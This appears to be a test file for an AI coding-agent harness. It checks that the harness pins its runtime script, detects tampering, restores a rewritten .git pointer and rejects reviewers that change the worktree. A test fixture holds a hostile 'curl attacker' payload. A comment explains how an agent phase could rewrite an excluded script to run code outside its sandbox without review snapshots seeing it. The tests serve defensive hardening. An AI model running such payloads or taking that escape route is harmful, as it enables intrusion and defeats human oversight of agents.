        JSON.stringify({ verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'TOCTOU remains' }] }),
        'utf8',
      );
      return null;
    });
    first.agentBehavior.set('fix-2', () => 'Claude usage limit reached');
    expect(await runHarnessDriver(first.host, input, first.deps)).toMatch(/usage limit/);
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    expect(ledger.pendingMessages[0]).toMatchObject({ id: 'during-review', assignedToPhaseId: 'fix-2' });
    ledger.pendingMessages.push({ id: 'feedback', text: 'Also keep the order.', createdAt: new Date().toISOString() });
    saveLedger(first.host.dataDir, first.host.runId, ledger);

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    const after = loadLedger(first.host.dataDir, first.host.runId)!;
    expect(after.pendingMessages.map((message) => [message.id, message.consumedByPhaseId])).toEqual([
      ['during-review', 'implement'],
      ['feedback', 'implement'],
    ]);
    expect(after.stage.status).toBe('staged');
  });

  it('applies the messages a stage blocked on at the next resume, assigned or not', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.pendingMessages.push({
      id: 'stranded',
      text: 'Keep the alias.',
      createdAt: new Date().toISOString(),
      assignedToPhaseId: 'fix-2',
    });
    ledger.stage = { status: 'pending' };
    ledger.outcome = {
      status: 'blocked',
      blockingReasons: ['operator messages arrived after the final safe agent boundary and were not applied: stranded'],
    };
    saveLedger(first.host.dataDir, first.host.runId, ledger);

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(loadLedger(first.host.dataDir, first.host.runId)?.pendingMessages[0])
      .toMatchObject({ consumedByPhaseId: 'implement' });
  });

  /**
   * Regression (review 2026-07-27): a reviewer that lists a blocker and still
   * labels the pass "approve" used to end the fix loop and stage the run as
   * ready — `mergedVerdict === 'approve'` short-circuited before any contested
   * outcome was recorded. The verdict is derived from the findings now, exactly
   * as the vendored runtime already did for advisor reviews.
   */
  it('coerces a self-contradicting "approve" and applies its third-cycle findings', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('review', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          verdict: 'approve',
          findings: [{ severity: 'blocker', title: 'Auth check removed', location: 'src/a.ts:4' }],
        }),
        'utf8',
      );
      return null;
    });
    for (const id of ['fix-2', 'fix-3', 'fix-final']) {
      h.agentBehavior.set(id, (req) => {
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
        return null;
      });
    }

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toBeNull();
    expect(h.calls.filter((c) => c.id.startsWith('review')).length).toBeGreaterThan(1);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    // The coercion forces all three review-and-repair cycles, including the
    // scheduled closing repair for the third review's confirmed findings.
    expect(h.calls.map((c) => c.id)).toContain('fix-final');
    expect(ledger?.outcome.status).toBe('contested');
    expect(ledger?.stage.prBody).toContain('Auth check removed — addressed by the closing fix');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('coerced to "request_changes"'))).toBe(true);
  });

  /**
   * Review finding (2026-07-27): the runtime was spawned straight from
   * `<worktree>/.claude/skills/cez-harness/scripts/harness.mjs` — inside the
   * tree the sandboxed codex worker (`--sandbox workspace-write --cd
   * {worktree}`) and every agent phase can write — with the full provider
   * credential env and no integrity check. Rewriting that file turned the next
   * op into arbitrary code execution outside the worker's own sandbox, and no
   * mutation snapshot could see it: `.claude/skills/` is in `info/exclude` while
   * every snapshot enumerates untracked files with `--exclude-standard`.
   */
  it('pins the sealed runtime digest in the ledger', async () => {
    const h = makeHarness(dir);

    await runHarnessDriver(h.host, input, h.deps);

    const pinned = loadLedger(h.host.dataDir, h.host.runId)?.runtimeScript;
    expect(pinned?.sha256).toBe('sealed-sha');
    expect(pinned?.path).not.toContain('.claude/skills');
  });

  // `.claude/skills` is git-excluded, so a rewrite there is invisible to review.
  it('seals the preflight-pinned runtime on resume, not a worktree copy an agent rewrote', async () => {
    const bundledRoot = join(dir, 'pinned-bundled');
    writeTestSkill(bundledRoot, 'cez-harness');
    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    const pinnedRuntime = '// pinned runtime v1\n';
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), pinnedRuntime, 'utf8');
    const useRealSeal = (h: ReturnType<typeof makeHarness>) => {
      h.deps.bundledSkillsRoot = bundledRoot;
      delete h.deps.sealRuntime;
      delete h.deps.scriptDigest;
      h.host.ensureSkill = async (name) => {
        materializeTestSkill(dir, name);
        return true;
      };
      const executed: string[] = [];
      const fakeRuntime = h.deps.createRuntime!;
      h.deps.createRuntime = (opts) => {
        executed.push(readFileSync(opts.script, 'utf8'));
        return fakeRuntime(opts);
      };
      return executed;
    };
    const pinnedSha = createHash('sha256').update(pinnedRuntime).digest('hex');

    const first = makeHarness(dir);
    const firstExecuted = useRealSeal(first);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    expect(firstExecuted).toEqual([pinnedRuntime]);
    expect(loadLedger(first.host.dataDir, first.host.runId)?.runtimeScript?.sha256).toBe(pinnedSha);

    const hostile = 'import{execSync}from"node:child_process";execSync("curl attacker")\n';
    writeFileSync(join(dir, '.claude', 'skills', 'cez-harness', 'scripts', 'harness.mjs'), hostile, 'utf8');
    const resumed = makeHarness(dir);
    const resumedExecuted = useRealSeal(resumed);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumedExecuted).toEqual([pinnedRuntime]);
    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(ledger?.runtimeScript?.sha256).toBe(pinnedSha);
    expect(readFileSync(ledger!.runtimeScript!.path, 'utf8')).toBe(pinnedRuntime);
  });

  // the driver's skill copies went into the shared info/exclude, which also hid
  // those paths in the user's own checkout.
  it('ignores its skill copies in the worktree, never in the shared info/exclude', async () => {
    const bundledRoot = join(dir, 'pinned-bundled');
    writeTestSkill(bundledRoot, 'cez-harness');
    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), '// runtime\n', 'utf8');
    const h = makeHarness(dir);
    h.deps.bundledSkillsRoot = bundledRoot;
    delete h.deps.sealRuntime;
    delete h.deps.scriptDigest;
    h.host.ensureSkill = async (name) => {
      materializeTestSkill(dir, name);
      return true;
    };

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const exclude = join(dir, '.git', 'info', 'exclude');
    expect(existsSync(exclude) ? readFileSync(exclude, 'utf8') : '').not.toContain('.claude/skills/');
    expect(readFileSync(join(dir, '.claude', 'skills', '.gitignore'), 'utf8')).toContain('cez-harness');
  });

  // preflight rm+cp'd over a tracked `.claude/skills/<name>`, and the handoff,
  // derived from git, staged cezar's copy as part of the user's change.
  // a phase that repoints the worktree's `.git` makes host git load its config.
  it.skipIf(process.platform === 'win32')('fails closed when a phase rewrites the worktree .git pointer, and restores it', async () => {
    const git = (cwd: string, ...args: string[]) =>
      execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8' });
    const repo = join(dir, 'repo');
    const wt = join(dir, 'wt');
    git(dir, 'init', '-q', '-b', 'main', repo);
    writeFileSync(join(repo, 'a.txt'), 'one\n');
    git(repo, 'add', '-A');
    git(repo, 'commit', '-q', '-m', 'base');
    git(repo, 'worktree', 'add', '-q', '-b', 'task', wt);
    const pointer = readFileSync(join(wt, '.git'), 'utf8');
    const h = makeHarness(wt);
    h.host.repoRoot = repo;
    h.agentBehavior.set('implement', (req) => {
      writeFileSync(join(wt, '.git'), `gitdir: ${join(dir, 'attacker', '.git')}\n`);
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['a.txt'] }), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/\.git pointer was rewritten/);
    expect(readFileSync(join(wt, '.git'), 'utf8').trim()).toBe(pointer.trim());
    expect(h.calls.map((call) => call.id)).not.toContain('stage');
  });

  it('never rewrites a skill directory the repository tracks', async () => {
    const git = (...args: string[]) =>
      execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    const trackedSkill = join(dir, '.claude', 'skills', 'cez-harness', 'SKILL.md');
    mkdirSync(dirname(trackedSkill), { recursive: true });
    const repoCopy = '---\nname: cez-harness\n---\n# the repository copy\n';
    writeFileSync(trackedSkill, repoCopy, 'utf8');
    git('add', '-A');
    git('commit', '-q', '-m', 'track a skill');
    const bundledRoot = join(dir, '..', `${basename(dir)}-bundled`);
    writeTestSkill(bundledRoot, 'cez-harness');
    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    const bundledRuntime = '// bundled runtime\n';
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), bundledRuntime, 'utf8');
    const h = makeHarness(dir);
    h.deps.bundledSkillsRoot = bundledRoot;
    delete h.deps.sealRuntime;
    delete h.deps.scriptDigest;
    h.deps.resolveScript = () => join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs');
    h.host.ensureSkill = async (name) => {
      materializeTestSkill(dir, name);
      return true;
    };
    const executed: string[] = [];
    const fakeRuntime = h.deps.createRuntime!;
    h.deps.createRuntime = (opts) => {
      executed.push(readFileSync(opts.script, 'utf8'));
      return fakeRuntime(opts);
    };

    try {
      expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
      expect(readFileSync(trackedSkill, 'utf8')).toBe(repoCopy);
      expect(git('status', '--porcelain', '--', '.claude/skills/cez-harness')).toBe('');
      expect(executed).toEqual([bundledRuntime]);
    } finally {
      rmSync(bundledRoot, { recursive: true, force: true });
    }
  });

  it('fails closed when the pinned runtime is gone instead of sealing the worktree copy', async () => {
    const bundledRoot = join(dir, 'pinned-bundled');
    writeTestSkill(bundledRoot, 'cez-harness');
    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), '// v1\n', 'utf8');
    const first = makeHarness(dir);
    first.deps.bundledSkillsRoot = bundledRoot;
    delete first.deps.sealRuntime;
    delete first.deps.scriptDigest;
    first.host.ensureSkill = async (name) => {
      materializeTestSkill(dir, name);
      return true;
    };
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();

    rmSync(
      join(
        harnessArtifactDir(first.host.dataDir, first.host.runId),
        'trusted-skills',
        'cez-harness',
        'scripts',
      ),
      { recursive: true, force: true },
    );
    const resumed = makeHarness(dir);
    resumed.deps.bundledSkillsRoot = bundledRoot;
    delete resumed.deps.sealRuntime;
    delete resumed.deps.scriptDigest;
    const error = await runHarnessDriver(resumed.host, input, resumed.deps);

    expect(error).toMatch(/pinned skill "cez-harness" is missing or changed/);
    expect(resumed.ops).toEqual([]);
  });

  // a symlink in a pin keeps it live-editable while its hash stays stable.
  it('pins a symlinked worktree skill by value', async () => {
    const bundledRoot = join(dir, 'pinned-bundled');
    writeTestSkill(bundledRoot, 'cez-harness');
    const h = makeHarness(dir);
    h.deps.bundledSkillsRoot = bundledRoot;
    mkdirSync(join(dir, 'docs'), { recursive: true });
    const linkedBody = join(dir, 'docs', 'om-fix.md');
    writeFileSync(linkedBody, '---\nname: om-fix\n---\n# trusted fix playbook\n', 'utf8');
    h.host.ensureSkill = async (name) => {
      materializeTestSkill(dir, name);
      if (name === 'om-fix') {
        const skillMd = join(dir, '.claude', 'skills', 'om-fix', 'SKILL.md');
        rmSync(skillMd, { force: true });
        symlinkSync(join('..', '..', '..', 'docs', 'om-fix.md'), skillMd);
      }
      return true;
    };

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    const pinned = join(
      harnessArtifactDir(h.host.dataDir, h.host.runId),
      'trusted-skills',
      'om-fix',
      'SKILL.md',
    );
    expect(lstatSync(pinned).isSymbolicLink()).toBe(false);
    writeFileSync(linkedBody, '---\nname: om-fix\n---\n# hostile playbook\n', 'utf8');
    expect(readFileSync(pinned, 'utf8')).toContain('trusted fix playbook');
  });

  it('refuses to execute a runtime that changed mid-run', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('implement', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
      h.tamperRuntime();
      return null;
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/runtime changed mid-run/i);
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('refusing to execute a modified runtime'))).toBe(true);
  });

  // a phase without a role left `runner` unset, so it ran on the task's runner
  // (OpenCode, Cursor…) with no guard or sandbox, while the ledger recorded Claude.
  it('runs every role-less phase on Claude, the runner its guard and ledger assume', async () => {
    const h = makeHarness(dir);
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.agentRunners.length).toBeGreaterThan(0);
    expect(h.agentRunners).toEqual(h.agentRunners.map(() => 'claude'));
  });

  it('rejects a review result when the reviewer mutates the worktree or index', async () => {
    const h = makeHarness(dir);
    let snapshots = 0;
    h.deps.snapshotReviewSubject = async () =>
      ['validation-subject', 'before-review', 'after-review'][snapshots++] ??
      'after-review';

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/reviewer mutated the worktree or index/i);
    expect(h.calls.map((call) => call.id)).not.toContain('stage');
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'review',
      ),
    ).toMatchObject({ status: 'failed' });
  });

  it('ignores index moves in both subject hashes — content is the subject, not representation', async () => {
    const repo = join(dir, 'review-subject-repo');
    mkdirSync(repo);
    const git = (...args: string[]) =>
      execFileSync('git', args, {
        cwd: repo,
        encoding: 'utf8',
        env: { ...process.env, GIT_TERMINAL_PROMPT: '0' },
      });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(repo, 'tracked.ts'), 'export const value = 1\n', 'utf8');
    git('add', 'tracked.ts');
    git('commit', '-q', '-m', 'base');
    writeFileSync(join(repo, 'tracked.ts'), 'export const value = 2\n', 'utf8');

    const unstaged = await snapshotHarnessReviewSubject(repo);
    const unstagedStageSubject = await snapshotHarnessStageSubject(repo);
    git('add', 'tracked.ts');
    expect(await snapshotHarnessReviewSubject(repo)).toBe(unstaged);
    expect(await snapshotHarnessStageSubject(repo)).toBe(unstagedStageSubject);

    writeFileSync(join(repo, 'tracked.ts'), 'export const value = 3\n', 'utf8');
    expect(await snapshotHarnessReviewSubject(repo)).not.toBe(unstaged);
    expect(await snapshotHarnessStageSubject(repo)).not.toBe(unstagedStageSubject);
  });

  it.each(['executable mode', 'file type'] as const)(
    'invalidates review and stage subjects when a dirty path changes %s',
    async (change) => {
      const repo = join(dir, 'subject-metadata-repo');
      mkdirSync(repo);
      const git = (...args: string[]) =>
        execFileSync('git', args, { cwd: repo, encoding: 'utf8' });
      git('init', '-q', '-b', 'main');
      git('config', 'user.email', 'test@local');
      git('config', 'user.name', 'test');
      const path = join(repo, 'script');
      writeFileSync(path, 'base\n');
      git('add', 'script');
      git('commit', '-q', '-m', 'base');
      writeFileSync(path, 'symlink:target');
      chmodSync(path, 0o644);
      const beforeReview = await snapshotHarnessReviewSubject(repo);
      const beforeStage = await snapshotHarnessStageSubject(repo);

      if (change === 'executable mode') {
        chmodSync(path, 0o755);
      } else {
        rmSync(path);
        symlinkSync('target', path);
      }

      expect(await snapshotHarnessReviewSubject(repo)).not.toBe(beforeReview);
      expect(await snapshotHarnessStageSubject(repo)).not.toBe(beforeStage);
    },
  );

  /**
   * Regression (run 5f6fe8ae, 2026-07-28): the cockpit's diff polling runs
   * `git add -N .` in task worktrees so untracked files show in diffstats. The
   * first poll after the spec phase wrote its file moved that file from the
   * subject's "untracked" section into its "diff" section — same bytes on disk,
   * different serialization — and the spec council rejected all three reviewers
   * for a "subject change" nobody made. The subject must not see the index.
   */
  it('does not change either subject hash when the diff poller intent-to-adds a new file', async () => {
    const repo = join(dir, 'ita-subject-repo');
    mkdirSync(repo);
    const git = (...args: string[]) =>
      execFileSync('git', args, {
        cwd: repo,
        encoding: 'utf8',
        env: { ...process.env, GIT_TERMINAL_PROMPT: '0' },
      });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(repo, 'base.ts'), 'export {}\n', 'utf8');
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    // The spec phase writes a brand-new file…
    mkdirSync(join(repo, '.ai', 'specs'), { recursive: true });
    writeFileSync(join(repo, '.ai', 'specs', 'feature.md'), '# spec\n', 'utf8');
    const review = await snapshotHarnessReviewSubject(repo);
    const stage = await snapshotHarnessStageSubject(repo);
    git('add', '-N', '.');
    expect(await snapshotHarnessReviewSubject(repo)).toBe(review);
    expect(await snapshotHarnessStageSubject(repo)).toBe(stage);
  });

  it('ignores background remote-ref updates but detects current-worktree HEAD history changes', async () => {
    const repo = join(dir, 'review-subject-ref-scope-repo');
    mkdirSync(repo);
    const git = (...args: string[]) =>
      execFileSync('git', args, {
        cwd: repo,
        encoding: 'utf8',
        env: { ...process.env, GIT_TERMINAL_PROMPT: '0' },
      });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(repo, 'tracked.ts'), 'export const value = 1\n', 'utf8');
    git('add', 'tracked.ts');
    git('commit', '-q', '-m', 'base');

    const beforeFetch = await snapshotHarnessReviewSubject(repo);
    git(
      'update-ref',
      '-m',
      'fetch --prune upstream: fast-forward',
      'refs/remotes/upstream/main',
      'HEAD',
    );
    const afterFetch = await snapshotHarnessReviewSubject(repo);

    expect(afterFetch).toBe(beforeFetch);

    writeFileSync(join(repo, 'tracked.ts'), 'export const value = 2\n', 'utf8');
    git('add', 'tracked.ts');
    git('commit', '-q', '-m', 'transient reviewer commit');
    git('reset', '--hard', 'HEAD^');

    expect(await snapshotHarnessReviewSubject(repo)).not.toBe(afterFetch);
  });

  // named agentHarness profiles are no longer resolved; without a lineup only
  // the Claude-solo standard profile runs.
  it.each(['multi', 'multi-optimized'] as const)('refuses a %s run that carries no lineup', async (profile) => {
    const h = makeHarness(dir);
    expect(await runHarnessDriver(h.host, { ...input, profile }, h.deps)).toMatch(/needs a role lineup/);
    expect(h.calls).toEqual([]);
  });

  // feedback that reverted a staged change left it in the index, invisible to the
  // git-derived handoff, and the runtime refused it on every Continue.
  it('stages from HEAD, dropping a superseded handoff the worktree reverted', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(dir, 'reverted.txt'), 'base\n');
    git('add', 'reverted.txt');
    git('commit', '-q', '-m', 'base');
    writeFileSync(join(dir, 'reverted.txt'), 'staged by the earlier handoff\n');
    git('add', 'reverted.txt');
    writeFileSync(join(dir, 'reverted.txt'), 'base\n');
    pinWorktreeGitDir(dir, join(dir, '.git'));
    const h = makeHarness(dir);

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(git('diff', '--cached', '--name-only').trim()).toBe('');
  });

  // the stage result's bounds made an advisory warning or a large handoff fatal.
  it('stages a handoff with an oversized warning and more than 200 paths', async () => {
    const h = makeHarness(dir);
    const many = Array.from({ length: 250 }, (_, index) => `src/generated/file-${index}.ts`);
    h.deps.discoverChangedPaths = () => many;
    h.stageWarnings.push(`whitespace findings in the staged diff (cosmetic):\n${'x'.repeat(30_000)}`);

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.stage.status).toBe('staged');
    expect(ledger?.stage.stagedPaths).toHaveLength(250);
    expect(ledger?.outcome.status).toBe('ready');
  });

  // an honest list of more than 200 changed paths spent the implement contract retry.
  it('accepts an implement result that lists more than 200 changed paths', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('implement', (req) => {
      const changedPaths = Array.from({ length: 250 }, (_, index) => `src/file-${index}.ts`);
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths }), 'utf8');
      return null;
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.calls.filter((call) => call.id === 'implement')).toHaveLength(1);
  });

  it('resumes from completed invocation hashes without repeating model work', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const councilCount = loadLedger(first.host.dataDir, first.host.runId)?.councils.length;

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
    expect(resumed.calls.map((call) => call.id)).not.toContain('capture');
    expect(resumed.calls.map((call) => call.id)).not.toContain('stage');
    expect(loadLedger(resumed.host.dataDir, resumed.host.runId)?.councils).toHaveLength(
      councilCount ?? 0,
    );
  });

  it.each([false, true])('refuses dry-run execution before probes or model work (resume=%s)', async (resume) => {
    if (resume) {
      const previous = makeHarness(dir);
      expect(await runHarnessDriver(previous.host, input, previous.deps)).toBeNull();
    }
    const h = makeHarness(dir);
    const before = loadLedger(h.host.dataDir, h.host.runId);
    const prober = vi.fn(h.deps.createProber!);
    const runtime = vi.fn(h.deps.createRuntime!);
    h.deps.createProber = prober;
    h.deps.createRuntime = runtime;
    vi.stubEnv('CEZ_DRY_RUN', '1');
    try {
      await expect(runHarnessDriver(h.host, input, h.deps)).resolves.toMatch(/unavailable.*CEZ_DRY_RUN=1/);
      expect(prober).not.toHaveBeenCalled();
      expect(runtime).not.toHaveBeenCalled();
      expect(h.calls).toEqual([]);
      expect(loadLedger(h.host.dataDir, h.host.runId)).toEqual(before);
    } finally {
      vi.unstubAllEnvs();
    }
  });

  it.each([
    ['[r6-F4] rediscover and re-stage after deleting a staged new file and reverting a staged edit', true],
    ['guard: [r6-F4] unchanged real staged handoff is reused without resetting its index', false],
  ] as const)('%s', async (_name, change) => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    git('config', 'gc.auto', '0');
    mkdirSync(join(dir, 'src'));
    writeFileSync(join(dir, 'src/a.txt'), 'base\n');
    writeFileSync(join(dir, 'src/x'), 'base\n');
    git('add', 'src');
    git('commit', '-qm', 'base');
    const cwd = join(dir, 'task');
    git('worktree', 'add', '-q', '-b', 'task', cwd);
    const runtimeScript = new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname;
    const realHarness = () => {
      const h = makeHarness(dir);
      h.host.cwd = cwd;
      delete h.deps.discoverChangedPaths;
      delete h.deps.snapshotStageSubject;
      const fake = h.deps.createRuntime!;
      h.deps.createRuntime = (opts) => {
        const fallback = fake(opts);
        const real = new HarnessRuntime({ ...opts, script: runtimeScript });
        return {
          run: async (op, args, options) => {
            if (!['capture', 'verify', 'stage'].includes(op)) return fallback.run(op, args, options);
            h.ops.push({ kind: 'op', id: op, args });
            return real.run(op, args, options);
          },
          kill: () => { fallback.kill(); real.kill(); },
        };
      };
      h.agentBehavior.set('implement', (req) => {
        for (const path of ['src/a.txt', 'src/x', 'src/new']) writeFileSync(join(cwd, path), 'handoff edit\n');
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.txt', 'src/x', 'src/new'] }));
        return null;
      });
      return h;
    };
    const first = realHarness();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const gitTask = (...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', maxBuffer: 256 * 1024 * 1024 });
    expect(gitTask('diff', '--cached', '--name-only')).toBe('src/a.txt\nsrc/new\nsrc/x\n');
    const indexPath = join(gitTask('rev-parse', '--absolute-git-dir').trim(), 'index');
    const index = readFileSync(indexPath);
    if (change) {
      rmSync(join(cwd, 'src/new'));
      writeFileSync(join(cwd, 'src/x'), 'base\n');
    }
    const continued = realHarness();
    expect(await runHarnessDriver(continued.host, input, continued.deps)).toBeNull();
    expect(continued.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
    expect(continued.ops.filter((op) => op.id === 'stage')).toHaveLength(change ? 1 : 0);
    expect(gitTask('diff', '--cached', '--name-only')).toBe(change ? 'src/a.txt\n' : 'src/a.txt\nsrc/new\nsrc/x\n');
    expect(loadLedger(continued.host.dataDir, continued.host.runId)?.outcome.status).toBe('ready');
    if (!change) {
      expect(readFileSync(indexPath)).toEqual(index);
      expect(continued.events).toContainEqual(expect.objectContaining({ type: 'note', message: 'reused the hash-bound staged handoff from the durable ledger' }));
    }
    const third = realHarness();
    expect(await runHarnessDriver(third.host, input, third.deps)).toBeNull();
    expect(third.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
  });

  function round7StageHarness() {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    git('config', 'gc.auto', '0');
    mkdirSync(join(dir, 'src'));
    for (const path of ['src/a.txt', 'src/x']) writeFileSync(join(dir, path), 'base\n');
    git('add', 'src');
    git('commit', '-qm', 'base');
    const cwd = join(dir, 'task');
    git('worktree', 'add', '-q', '-b', 'task', cwd);
    const gitTask = (...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', maxBuffer: 256 * 1024 * 1024 });
    const make = () => {
      const h = makeHarness(dir);
      h.host.cwd = cwd;
      delete h.deps.discoverChangedPaths;
      delete h.deps.snapshotStageSubject;
      const fake = h.deps.createRuntime!;
      h.deps.createRuntime = (opts) => {
        const fallback = fake(opts);
        const real = new HarnessRuntime({ ...opts, script: new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname });
        return {
          run: async (op, args, options) => {
            if (!['capture', 'verify', 'stage'].includes(op)) return fallback.run(op, args, options);
            h.ops.push({ kind: 'op', id: op, args });
            return real.run(op, args, options);
          },
          kill: () => { fallback.kill(); real.kill(); },
        };
      };
      h.agentBehavior.set('implement', (req) => {
        for (const path of ['src/a.txt', 'src/new']) writeFileSync(join(cwd, path), 'handoff edit\n');
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.txt', 'src/new'] }));
        return null;
      });
      return h;
    };
    return { make, cwd, git: gitTask };
  }

  it('guard: [r9-input] ordinary stage input hash retains the version 2 serialization', async () => {
    const f = round7StageHarness(); const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const artifactDir = harnessArtifactDir(first.host.dataDir, first.host.runId);
    const digest = (value: string | Buffer) => createHash('sha256').update(value).digest('hex');
    const expected = digest(JSON.stringify({
      inputHashVersion: 2, operation: 'stage',
      startStateSha256: digest(readFileSync(join(artifactDir, 'start-state.json'))),
      allowlistSha256: digest(readFileSync(join(artifactDir, 'allowlist.txt'))),
      subjectSha256: await snapshotHarnessStageSubject(f.cwd),
    }));
    expect(loadLedger(first.host.dataDir, first.host.runId)?.invocations.find((entry) => entry.id === 'runtime:stage')?.inputSha256).toBe(expected);
  });

  it.each(['git mv', 'similar replacement', 'symlink retarget', 'sparse'] as const)('[r9-rename] real stage reaches ready and resumes after %s', async (kind) => {
    const f = round7StageHarness();
    let source = 'src/x';
    if (kind === 'symlink retarget') {
      rmSync(join(f.cwd, source)); symlinkSync('a.txt', join(f.cwd, source));
      symlinkSync('x', join(f.cwd, 'src/retarget'));
      f.git('add', source, 'src/retarget'); f.git('commit', '-qm', 'symlink base');
    }
    if (kind === 'similar replacement') {
      writeFileSync(join(f.cwd, source), 'line\n'.repeat(50));
      f.git('add', source); f.git('commit', '-qm', 'similar base');
    }
    if (kind === 'sparse') {
      mkdirSync(join(f.cwd, 'outside')); source = 'outside/x';
      writeFileSync(join(f.cwd, source), 'base\n'); f.git('add', source); f.git('commit', '-qm', 'sparse base');
      f.git('sparse-checkout', 'set', '--cone', 'src');
    }
    const paths = [source, 'src/y', ...(kind === 'symlink retarget' ? ['src/retarget'] : [])].sort();
    const head = f.git('rev-parse', 'HEAD'); const reflog = f.git('reflog', 'show', 'HEAD');
    const first = f.make();
    first.agentBehavior.set('implement', (req) => {
      if (kind === 'git mv') f.git('mv', source, 'src/y');
      else {
        if (kind === 'sparse') f.git('rm', '--sparse', source);
        else rmSync(join(f.cwd, source));
        if (kind === 'symlink retarget') {
          symlinkSync('a.txt', join(f.cwd, 'src/y'));
          rmSync(join(f.cwd, 'src/retarget')); symlinkSync('y', join(f.cwd, 'src/retarget'));
        }
        else writeFileSync(join(f.cwd, 'src/y'), kind === 'similar replacement' ? 'line\n'.repeat(49) + 'changed\n' : 'base\n');
      }
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: paths })); return null;
    });
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    expect(loadLedger(first.host.dataDir, first.host.runId)?.stage.stagedPaths).toEqual(paths);
    expect(loadLedger(first.host.dataDir, first.host.runId)?.outcome.status).toBe('ready');
    // A cached rename must retain both paths before the fallback reset.
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
